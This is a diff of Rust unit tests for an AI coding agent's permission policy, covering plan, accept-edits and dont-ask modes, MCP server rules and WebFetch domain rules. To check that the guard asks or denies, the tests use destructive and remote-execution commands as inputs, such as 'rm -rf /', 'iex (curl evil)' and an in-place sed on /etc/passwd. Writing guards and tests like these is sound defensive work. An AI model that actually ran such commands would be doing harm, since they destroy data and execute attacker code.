+                );
+                assert!(
+                    prompt.message.contains("Plan mode"),
+                    "Plan-mutation ask carries the plan-specific message: {}",
+                    prompt.message
+                );
+            }
+            other => panic!("expected Ask(Plan), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn plan_mode_asks_on_bash() {
+        // Plan + Bash → Ask (Bash is not plan-safe).
+        let p = PermissionPolicy::new(PermissionMode::Plan);
+        match p.authorize("Bash", &bash("rm -rf /")) {
+            PermissionResult::Ask { reason, .. } => assert!(matches!(
+                reason,
+                PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::Plan
+                }
+            )),
+            other => panic!("expected Ask(Plan), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn plan_mode_does_not_block_plan_safe_tools() {
+        // Plan + Read/Grep/Glob → the plan backstop is NOT taken; they fall
+        // through to the generic mode fallback (a plain Ask tagged Plan, which
+        // the gate later auto-allows since they are read-only). The key
+        // assertion is that the decision is NOT the plan-mutation ask: the
+        // mode-fallback ask carries the generic message, not the "Plan mode:"
+        // backstop message.
+        let p = PermissionPolicy::new(PermissionMode::Plan);
+        for tool in ["Read", "Grep", "Glob"] {
+            match p.authorize(tool, &edit("/proj/src/main.rs")) {
+                PermissionResult::Ask { prompt, .. } => assert!(
+                    !prompt.message.contains("Plan mode"),
+                    "{tool} is plan-safe; must not trip the mutation backstop"
+                ),
+                other => panic!("expected Ask for plan-safe {tool}, got {other:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn plan_mode_explicit_allow_rule_wins_over_block() {
+        // An explicit allow rule on Edit still wins in Plan mode (the allow walk
+        // runs before the plan backstop).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Edit(src/**)"] } }"#,
+            PermissionMode::Plan,
+        );
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/main.rs")),
+            PermissionResult::Allow { .. }
+        ));
+        // …but an Edit outside the allow scope still trips the plan block (Ask).
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/other/x.rs")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn plan_mode_deny_rule_still_wins() {
+        // A deny rule wins over the plan ask (deny walk precedes the backstop).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Edit(src/**)"] } }"#,
+            PermissionMode::Plan,
+        );
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/secret.rs")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn user_settings_content_rule_roots_at_lingxi_home() {
+        // `/x/**` in a USER-settings rule resolves against ~/.claude, not cwd.
+        let rules = crate::loader::permission_rules_from_settings_json(
+            r#"{ "permissions": { "deny": ["Read(/agents/**)"] } }"#,
+            PermissionRuleSource::UserSettings,
+        )
+        .unwrap();
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules).with_roots(roots());
+        assert!(matches!(
+            p.authorize("Read", &edit("/home/u/.lingxi/agents/foo.md")),
+            PermissionResult::Deny { .. }
+        ));
+        // Same relative path under cwd is NOT denied (different root).
+        assert!(matches!(
+            p.authorize("Read", &edit("/proj/agents/foo.md")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    // ── Batch 4: auto-mode dangerous-permission strip/restore ─────────────
+
+    fn allow_rule(tool: &str, content: Option<&str>) -> PermissionRule {
+        PermissionRule {
+            value: PermissionRuleValue {
+                tool_name: tool.into(),
+                rule_content: content.map(str::to_string),
+            },
+            behavior: PermissionBehavior::Allow,
+            source: PermissionRuleSource::UserSettings,
+        }
+    }
+
+    fn allow_count(p: &PermissionPolicy) -> usize {
+        p.allow_rules.values().flatten().count()
+    }
+
+    #[test]
+    fn ask_messages_are_byte_faithful() {
+        // Rule ask ⇒ createPermissionRequestMessage rule branch (permissions.ts:163).
+        let rule = PermissionRule {
+            value: PermissionRuleValue {
+                tool_name: "Bash".into(),
+                rule_content: Some("rm:*".into()),
+            },
+            behavior: PermissionBehavior::Ask,
+            source: PermissionRuleSource::ProjectSettings,
+        };
+        match ask_with_rule(&rule, "Bash") {
+            PermissionResult::Ask { prompt, .. } => assert_eq!(
+                prompt.message,
+                "Permission rule 'Bash(rm:*)' from shared project settings requires approval for this Bash command"
+            ),
+            _ => panic!("expected Ask"),
+        }
+        // Mode ask ⇒ mode branch (permissions.ts:200) with the Plan Mode title.
+        match ask_with_mode(PermissionMode::Plan, "Edit") {
+            PermissionResult::Ask { prompt, .. } => assert_eq!(
+                prompt.message,
+                "Current permission mode (Plan Mode) requires approval for this Edit command"
+            ),
+            _ => panic!("expected Ask"),
+        }
+        // Mode titles byte-locked to getModeConfig (PermissionMode.ts:46-74).
+        assert_eq!(PermissionMode::Default.title(), "Default");
+        assert_eq!(PermissionMode::AcceptEdits.title(), "Accept edits");
+        assert_eq!(PermissionMode::BypassPermissions.title(), "Bypass Permissions");
+        assert_eq!(PermissionMode::DontAsk.title(), "Don't Ask");
+    }
+
+    #[test]
+    fn bash_content_deny_carries_the_command_in_the_message() {
+        // deny:[Bash(rm:*)] matching `rm -rf /` ⇒ bashPermissions.ts:1003:
+        // `Permission to use Bash with command ${input.command.trim()} has been denied.`
+        let mut p = PermissionPolicy::new(PermissionMode::Default);
+        let rule = PermissionRule {
+            value: PermissionRuleValue {
+                tool_name: "Bash".into(),
+                rule_content: Some("rm:*".into()),
+            },
+            behavior: PermissionBehavior::Deny,
+            source: PermissionRuleSource::UserSettings,
+        };
+        p.deny_rules.entry(rule.source).or_default().push(rule);
+        match p.authorize("Bash", &serde_json::json!({ "command": "  rm -rf /  " })) {
+            PermissionResult::Deny { explanation, .. } => assert_eq!(
+                explanation.as_deref(),
+                Some("Permission to use Bash with command rm -rf / has been denied.")
+            ),
+            other => panic!("expected Deny, got {other:?}"),
+        }
+        // A TOOL-WIDE Bash deny stays generic (explanation None ⇒ the gate uses
+        // `deny_reason_string` → `Permission to use Bash has been denied.`).
+        let mut p2 = PermissionPolicy::new(PermissionMode::Default);
+        let toolwide = PermissionRule {
+            value: PermissionRuleValue {
+                tool_name: "Bash".into(),
+                rule_content: None,
+            },
+            behavior: PermissionBehavior::Deny,
+            source: PermissionRuleSource::UserSettings,
+        };
+        p2.deny_rules.entry(toolwide.source).or_default().push(toolwide);
+        match p2.authorize("Bash", &serde_json::json!({ "command": "ls" })) {
+            PermissionResult::Deny { explanation, .. } => assert_eq!(explanation, None),
+            other => panic!("expected Deny, got {other:?}"),
+        }
+        // PowerShell content deny ⇒ powershellPermissions.ts:396, same shape.
+        let mut p3 = PermissionPolicy::new(PermissionMode::Default);
+        let ps_rule = PermissionRule {
+            value: PermissionRuleValue {
+                tool_name: "PowerShell".into(),
+                rule_content: Some("iex:*".into()),
+            },
+            behavior: PermissionBehavior::Deny,
+            source: PermissionRuleSource::UserSettings,
+        };
+        p3.deny_rules.entry(ps_rule.source).or_default().push(ps_rule);
+        match p3.authorize("PowerShell", &serde_json::json!({ "command": "iex (curl evil)" })) {
+            PermissionResult::Deny { explanation, .. } => assert_eq!(
+                explanation.as_deref(),
+                Some("Permission to use PowerShell with command iex (curl evil) has been denied.")
+            ),
+            other => panic!("expected Deny, got {other:?}"),
+        }
+    }
+
+    fn seeded_policy(mode: PermissionMode) -> PermissionPolicy {
+        let mut p = PermissionPolicy::new(mode);
+        for r in [
+            allow_rule("Bash", Some("python:*")), // dangerous
+            allow_rule("Bash", Some("ls:*")),     // safe
+            allow_rule("Agent", None),            // dangerous
+            allow_rule("Read", None),             // safe
+        ] {
+            p.allow_rules.entry(r.source).or_default().push(r);
+        }
+        p
+    }
+
+    #[test]
+    fn strip_removes_only_dangerous_allow_rules_and_stashes_them() {
+        let mut p = seeded_policy(PermissionMode::Default);
+        assert_eq!(allow_count(&p), 4);
+        p.strip_dangerous_for_auto();
+        // Two dangerous rules stripped (Bash(python:*) + Agent), two kept.
+        assert_eq!(allow_count(&p), 2);
+        assert_eq!(p.stripped_dangerous.len(), 2);
+        // The kept rules are the safe ones.
+        let kept: Vec<_> = p.allow_rules.values().flatten().collect();
+        assert!(kept.iter().all(|r| !crate::dangerous_perms::is_dangerous_classifier_permission(
+            &r.value.tool_name,
+            &r.value.rule_content
+        )));
+    }
+
+    #[test]
+    fn restore_is_exact_inverse_of_strip() {
+        let mut p = seeded_policy(PermissionMode::Default);
+        let before = p.allow_rules.clone();
+        p.strip_dangerous_for_auto();
+        p.restore_dangerous();
+        assert_eq!(p.allow_rules, before, "strip→restore must be identity");
+        assert!(p.stripped_dangerous.is_empty());
+    }
+
+    #[test]
+    fn second_restore_is_a_noop() {
+        let mut p = seeded_policy(PermissionMode::Default);
+        p.strip_dangerous_for_auto();
+        p.restore_dangerous();
+        let after_first = p.allow_rules.clone();
+        p.restore_dangerous(); // stash already empty
+        assert_eq!(p.allow_rules, after_first);
+        assert!(p.stripped_dangerous.is_empty());
+    }
+
+    #[test]
+    fn set_mode_strips_on_enter_auto_and_restores_on_leave() {
+        let mut p = seeded_policy(PermissionMode::Default);
+        let before = p.allow_rules.clone();
+
+        p.set_mode(PermissionMode::Auto);
+        assert_eq!(p.mode, PermissionMode::Auto);
+        assert_eq!(allow_count(&p), 2); // dangerous stripped
+        assert_eq!(p.stripped_dangerous.len(), 2);
+
+        p.set_mode(PermissionMode::Default);
+        assert_eq!(p.mode, PermissionMode::Default);
+        assert_eq!(p.allow_rules, before); // restored
+        assert!(p.stripped_dangerous.is_empty());
+    }
+
+    #[test]
+    fn set_mode_to_same_mode_is_noop() {
+        let mut p = seeded_policy(PermissionMode::Auto);
+        // Already Auto; transitioning Auto→Auto must NOT strip.
+        p.set_mode(PermissionMode::Auto);
+        assert_eq!(allow_count(&p), 4);
+        assert!(p.stripped_dangerous.is_empty());
+    }
+
+    #[test]
+    fn set_mode_between_two_non_auto_modes_leaves_rules_untouched() {
+        let mut p = seeded_policy(PermissionMode::Default);
+        let before = p.allow_rules.clone();
+        p.set_mode(PermissionMode::AcceptEdits);
+        assert_eq!(p.mode, PermissionMode::AcceptEdits);
+        assert_eq!(p.allow_rules, before);
+        assert!(p.stripped_dangerous.is_empty());
+    }
+
+    #[test]
+    fn auto_fallback_asks_for_stripped_tool() {
+        // After stripping the `Agent` allow rule on entry to Auto, `Agent` has no
+        // remaining allow rule, so Auto (classifier unwired) falls through to ask
+        // — strip is behavior-neutral relative to the unwired Auto classifier.
+        let mut p = seeded_policy(PermissionMode::Default);
+        // Before: the Agent allow rule auto-allows (tool-wide, no roots).
+        assert!(matches!(
+            p.authorize("Agent", &serde_json::json!({})),
+            PermissionResult::Allow { .. }
+        ));
+        p.set_mode(PermissionMode::Auto);
+        // After strip: no Agent allow rule remains → Auto fallback asks.
+        assert!(matches!(
+            p.authorize("Agent", &serde_json::json!({})),
+            PermissionResult::Ask { .. }
+        ));
+        // Leaving Auto restores it → auto-allow again.
+        p.set_mode(PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Agent", &serde_json::json!({})),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── Batch 1: AcceptEdits working-dir auto-allow for editors ───────────
+
+    fn accept_edits_policy(raw: &str) -> PermissionPolicy {
+        let rules = crate::loader::permission_rules_from_settings_json(
+            raw,
+            PermissionRuleSource::ProjectSettings,
+        )
+        .unwrap();
+        PermissionPolicy::from_rules(PermissionMode::AcceptEdits, rules).with_roots(roots())
+    }
+
+    #[test]
+    fn accept_edits_auto_allows_editor_inside_cwd() {
+        // (a) AcceptEdits + Edit inside cwd → Allow tagged with AcceptEdits mode.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        match p.authorize("Edit", &edit("/proj/src/x.rs")) {
+            PermissionResult::Allow { reason, .. } => assert!(
+                matches!(
+                    reason,
+                    PermissionDecisionReason::PermissionMode {
+                        mode: PermissionMode::AcceptEdits
+                    }
+                ),
+                "auto-allow must be tagged with AcceptEdits mode, got {reason:?}"
+            ),
+            other => panic!("expected Allow(AcceptEdits), got {other:?}"),
+        }
+        // Write / NotebookEdit (other editors) are likewise auto-allowed.
+        assert!(matches!(
+            p.authorize("Write", &edit("/proj/out/y.rs")),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+        assert!(matches!(
+            p.authorize(
+                "NotebookEdit",
+                &serde_json::json!({ "notebook_path": "/proj/nb.ipynb" })
+            ),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_asks_for_editor_outside_cwd() {
+        // (b) Edit outside cwd → not auto-allowed → falls through to AcceptEdits
+        // mode ask.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        match p.authorize("Edit", &edit("/elsewhere/x.rs")) {
+            PermissionResult::Ask { reason, .. } => assert!(matches!(
+                reason,
+                PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                }
+            )),
+            other => panic!("expected Ask, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn accept_edits_does_not_auto_allow_non_editors() {
+        // (c) AcceptEdits must NOT auto-allow Read / Glob (non-editor file tools)
+        // — those fall through to the AcceptEdits-mode ask. A Bash command whose
+        // base command is NOT on `ACCEPT_EDITS_ALLOWED_COMMANDS` (`curl`) likewise
+        // falls through (the bash auto-allow arm declines and the mode ask fires).
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        // Bash with a non-allowlisted base command → not auto-allowed → ask.
+        assert!(matches!(
+            p.authorize("Bash", &serde_json::json!({ "command": "curl https://x" })),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+        // Read: a reader (not an editor) targeting a path inside cwd.
+        assert!(matches!(
+            p.authorize("Read", &edit("/proj/src/x.rs")),
+            PermissionResult::Ask { .. }
+        ));
+        // Glob (reader) inside cwd is also not auto-allowed.
+        assert!(matches!(
+            p.authorize("Glob", &serde_json::json!({ "path": "/proj/src" })),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_content_deny_rule_still_wins() {
+        // (d) A content DENY rule on the path beats the AcceptEdits auto-allow
+        // (the deny walk precedes the auto-allow branch).
+        let p = accept_edits_policy(r#"{ "permissions": { "deny": ["Edit(src/**)"] } }"#);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/secret.rs")),
+            PermissionResult::Deny { .. }
+        ));
+        // A path NOT covered by the deny rule is still auto-allowed.
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/other/ok.rs")),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_safety_blocks_git_config_inside_cwd() {
+        // (e) `.git/config` inside cwd → the auto-edit safety guard fails, so the
+        // branch is NOT taken and the call falls through to the AcceptEdits ask
+        // (never auto-allowed).
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/.git/config")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+        // `.lingxi/settings.json` (claude-config) is likewise blocked → ask.
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/.lingxi/settings.json")),
+            PermissionResult::Ask { .. }
+        ));
+        // …but a path under `.lingxi/worktrees/` is structural → auto-allowed.
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/.lingxi/worktrees/x/file.rs")),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_additional_working_dir_is_honored() {
+        // An editor inside an ADDITIONAL working dir is auto-allowed.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#)
+            .with_working_dirs(vec![PathBuf::from("/extra/work")]);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/extra/work/file.rs")),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+        // Still outside both cwd and the extra dir → ask.
+        assert!(matches!(
+            p.authorize("Edit", &edit("/nope/file.rs")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_without_roots_falls_through_to_ask() {
+        // No roots → the working-dir auto-allow cannot run; AcceptEdits collapses
+        // to the mode ask (backward-compatible with the pre-Batch-1 behavior).
+        let p = PermissionPolicy::new(PermissionMode::AcceptEdits);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/x.rs")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_explicit_allow_rule_still_allows() {
+        // An explicit allow rule continues to win (allow walk precedes the
+        // auto-allow branch) — and still produces an Allow.
+        let p = accept_edits_policy(r#"{ "permissions": { "allow": ["Edit(src/**)"] } }"#);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/x.rs")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── PERM final: AcceptEdits bash auto-allow (modeValidation + sed guard) ─
+
+    #[test]
+    fn accept_edits_bash_mkdir_inside_cwd_auto_allows() {
+        // AcceptEdits + `mkdir foo` (an ACCEPT_EDITS_ALLOWED_COMMAND) inside cwd
+        // → Allow tagged with AcceptEdits mode.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        match p.authorize("Bash", &bash("mkdir foo")) {
+            PermissionResult::Allow { reason, .. } => assert!(
+                matches!(
+                    reason,
+                    PermissionDecisionReason::PermissionMode {
+                        mode: PermissionMode::AcceptEdits
+                    }
+                ),
+                "bash auto-allow must be tagged AcceptEdits, got {reason:?}"
+            ),
+            other => panic!("expected Allow(AcceptEdits), got {other:?}"),
+        }
+        // A compound of allowlisted commands is likewise auto-allowed.
+        assert!(matches!(
+            p.authorize("Bash", &bash("mkdir foo && touch foo/bar")),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_bash_dangerous_rm_still_asks() {
+        // `rm -rf /` STILL asks — the dangerous-removal guard (step 2) runs BEFORE
+        // the bash auto-allow arm, so the auto-allow never bypasses it.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -rf /")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_bash_redirect_outside_cwd_still_asks() {
+        // `echo x > /etc/y` STILL asks — the path-constraint guard (step 2b) runs
+        // before the bash auto-allow arm. (echo is not even on the allowlist, but
+        // the path-constraint ask is what wins, and it wins regardless.)
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo x > /etc/y")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_bash_safe_sed_inside_cwd_auto_allows() {
+        // A safe read-only `sed -n p file` inside cwd → Allow(AcceptEdits).
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        assert!(matches!(
+            p.authorize("Bash", &bash("sed -n p file.txt")),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+        // An in-place sed writing inside cwd is also auto-allowed.
+        assert!(matches!(
+            p.authorize("Bash", &bash("sed -i 's/a/b/' ./local.txt")),
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accept_edits_bash_unsafe_sed_outside_cwd_asks_with_containment() {
+        // `sed -i ... /etc/passwd` writes in-place OUTSIDE cwd. Per claude-code's
+        // ordering (`bashPermissions.ts:1106-1122`), `validateCommandPaths` (run
+        // by `checkPathConstraints`, step 3) fires BEFORE `checkSedConstraints`
+        // (step 5b) — so the PATH-CONTAINMENT ask wins, not the sed-constraints
+        // ask. sed is a `write` op (the `-i` in-place edit is not read-only-
+        // allowlisted), so the verb is "edit files in". This was previously
+        // asserted to emit SED_ASK_MESSAGE; that was a precedence bug fixed by
+        // wiring the per-command path-containment guard.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        match p.authorize("Bash", &bash("sed -i 's/a/b/' /etc/passwd")) {
+            PermissionResult::Ask { reason, prompt, .. } => {
+                assert!(
+                    matches!(reason, PermissionDecisionReason::Other { .. }),
+                    "containment ask uses the Other reason, got {reason:?}"
+                );
+                assert_eq!(
+                    prompt.message,
+                    "sed in '/etc/passwd' was blocked. For security, LingXi \
+                     may only edit files in the allowed working directories for \
+                     this session: '/proj'."
+                );
+            }
+            other => panic!("expected Ask(Other), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn accept_edits_bash_dangerous_sed_inside_cwd_asks_with_sed_constraint() {
+        // A DANGEROUS sed (the `e` execute flag) whose file target stays INSIDE
+        // cwd: path-containment passes (./local → /proj/local is in cwd), so
+        // control falls through to the sed-constraints layer (step 3-sed), which
+        // emits the byte-locked SED ask message. This proves the sed-constraints
+        // layer is still reachable when path-containment is satisfied.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        match p.authorize("Bash", &bash("sed 's/a/b/e' ./local")) {
+            PermissionResult::Ask { reason, prompt, .. } => {
+                assert!(
+                    matches!(reason, PermissionDecisionReason::Other { .. }),
+                    "sed ask must use the Other reason, got {reason:?}"
+                );
+                assert_eq!(
+                    prompt.message,
+                    crate::sed_validation::SED_ASK_MESSAGE,
+                    "carries the byte-locked sed ask message"
+                );
+            }
+            other => panic!("expected Ask(Other), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn accept_edits_bash_curl_not_auto_allowed() {
+        // `curl ...` is NOT on ACCEPT_EDITS_ALLOWED_COMMANDS → the bash auto-allow
+        // arm declines → falls through to the AcceptEdits-mode ask.
+        let p = accept_edits_policy(r#"{ "permissions": {} }"#);
+        assert!(matches!(
+            p.authorize("Bash", &bash("curl https://evil.test")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+        // A compound with even ONE non-allowlisted base command is not allowed.
+        assert!(matches!(
+            p.authorize("Bash", &bash("mkdir foo && curl https://x")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::AcceptEdits
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn non_accept_edits_mode_bash_auto_allow_unaffected() {
+        // In a non-AcceptEdits mode the bash auto-allow arm never runs: `mkdir foo`
+        // falls through to the Default-mode ask (no auto-allow).
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("mkdir foo")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::Default
+                },
+                ..
+            }
+        ));
+    }
+
+    // ── PERM.1: DontAsk ask→deny transform (read-only tools exempt) ────────
+
+    #[test]
+    fn dontask_converts_final_ask_to_deny_for_mutating_tool() {
+        // A mutating tool with no matching rule → mode-fallback ask → converted
+        // to deny by the DontAsk transform (claude-code permissions.ts:503-517).
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::DontAsk);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/x.rs")),
+            PermissionResult::Deny {
+                reason: PermissionDecisionReason::PermissionMode {
+                    mode: PermissionMode::DontAsk
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn dontask_converts_ask_rule_to_deny() {
+        // An ASK RULE that fires used to escape the old mode-only deny (it
+        // returned Ask before the fallback). It is now converted to deny too.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["Bash(npm publish:*)"] } }"#,
+            PermissionMode::DontAsk,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm publish --tag beta")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn dontask_does_not_over_deny_read_only_tools() {
+        // Read-only / AllowByDefault tools are NOT converted — they stay `Ask` so
+        // the gate's read-only default auto-allows them (TS: their checkPermissions
+        // returns allow before the transform). This is the over-denial fix.
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::DontAsk);
+        for tool in ["Read", "Grep", "Glob", "LSP"] {
+            assert!(
+                matches!(
+                    p.authorize(tool, &serde_json::json!({})),
+                    PermissionResult::Ask { .. }
+                ),
+                "DontAsk must not over-deny read-only {tool}"
+            );
+        }
+        // …but a mutating tool is still denied.
+        assert!(matches!(
+            p.authorize("Write", &edit("/proj/src/x.rs")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn dontask_allow_rule_still_allows() {
+        // An explicit allow rule wins (returns Allow before the transform).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(ls:*)"] } }"#,
+            PermissionMode::DontAsk,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("ls -l")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── PERM.2: MCP server-level rule matches the server's tools ───────────
+
+    #[test]
+    fn server_level_mcp_deny_matches_servers_tools() {
+        // `mcp__github` (no specific tool) denies every `mcp__github__*` tool.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["mcp__github"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("mcp__github__create_issue", &serde_json::json!({})),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("mcp__github__list_repos", &serde_json::json!({})),
+            PermissionResult::Deny { .. }
+        ));
+        // A DIFFERENT server is unaffected.
+        assert!(matches!(
+            p.authorize("mcp__gitlab__create_issue", &serde_json::json!({})),
+            PermissionResult::Ask { .. }
+        ));
+        // The exact server FQN itself is still matched.
+        assert!(matches!(
+            p.authorize("mcp__github", &serde_json::json!({})),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn server_level_mcp_wildcard_matches() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["mcp__github__*"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("mcp__github__create_issue", &serde_json::json!({})),
+            PermissionResult::Allow { .. }
+        ));
+        // Different server → no match.
+        assert!(matches!(
+            p.authorize("mcp__other__x", &serde_json::json!({})),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn server_level_mcp_match_works_without_roots() {
+        // The phase-2 (no-roots) path also honors the server-level match…
+        let rules = crate::loader::permission_rules_from_settings_json(
+            r#"{ "permissions": { "deny": ["mcp__github"] } }"#,
+            PermissionRuleSource::ProjectSettings,
+        )
+        .unwrap();
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules);
+        assert!(matches!(
+            p.authorize("mcp__github__create_issue", &serde_json::json!({})),
+            PermissionResult::Deny { .. }
+        ));
+        // …yet a server rule never matches a NON-mcp builtin of the same word.
+        assert!(matches!(
+            p.authorize("github", &serde_json::json!({})),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    // ── PERM.3: content-scoped rules apply only when the content matches ────
+
+    fn webfetch(url: &str) -> serde_json::Value {
+        serde_json::json!({ "url": url })
+    }
+
+    #[test]
+    fn webfetch_domain_deny_only_matches_that_domain() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["WebFetch(domain:evil.com)"] } }"#,
+            PermissionMode::Default,
+        );
+        // Matching domain → denied.
+        assert!(matches!(
+            p.authorize("WebFetch", &webfetch("https://evil.com/path?q=1")),
+            PermissionResult::Deny { .. }
+        ));
+        // A DIFFERENT domain is NOT denied (no over-match of the whole tool).
+        assert!(matches!(
+            p.authorize("WebFetch", &webfetch("https://good.com/page")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn webfetch_domain_allow_only_matches_that_domain() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["WebFetch(domain:api.example.com)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("WebFetch", &webfetch("https://api.example.com/v1")),
+            PermissionResult::Allow { .. }
+        ));
+        assert!(matches!(
+            p.authorize("WebFetch", &webfetch("https://other.example.com/v1")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    // ── R-D4: WHATWG-compliant WebFetch hostname extraction (`_qa`) ────────
+
+    #[test]
+    fn url_hostname_plain_ascii_unchanged() {
+        // The common case must be byte-identical to the old hand-rolled splitter:
+        // scheme + path stripped, userinfo + port dropped, IPv6 brackets kept.
+        assert_eq!(url_hostname("https://example.com/path").as_deref(), Some("example.com"));
+        assert_eq!(url_hostname("https://example.com").as_deref(), Some("example.com"));
+        assert_eq!(url_hostname("https://sub.example.com/a?q#f").as_deref(), Some("sub.example.com"));
+        assert_eq!(
+            url_hostname("https://user:pass@example.com:8080/p?q#f").as_deref(),
+            Some("example.com")
+        );
+        assert_eq!(url_hostname("https://[::1]:8080/p").as_deref(), Some("[::1]"));
+        // WHATWG lowercases the host (matches `new URL().hostname`).
